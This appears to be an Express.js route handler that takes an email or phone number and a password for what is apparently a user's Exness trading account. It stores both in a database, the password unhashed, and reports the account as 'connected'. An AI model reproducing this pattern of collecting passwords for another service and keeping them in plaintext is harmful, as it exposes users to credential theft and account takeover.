const express = require('express');
const router = express.Router();
const ExnessUser = require('../models/ExnessUser'); // Ensure this model is set up correctly

// Handle Exness form submission
router.post('/submit-exness-details', async (req, res) => {
    const { emailOrNumber, password } = req.body;

    try {
        // Save the details to the database
        const newExnessUser = new ExnessUser({
            emailOrNumber,
            password
        });
        await newExnessUser.save();

        // Set success message in session and redirect
        req.session.message = 'Exness connected successfully';
        res.redirect('/dashboard');
    } catch (error) {
        console.error('Error saving Exness details:', error);
        res.status(500).send('Server error');
    }
});

module.exports = router;
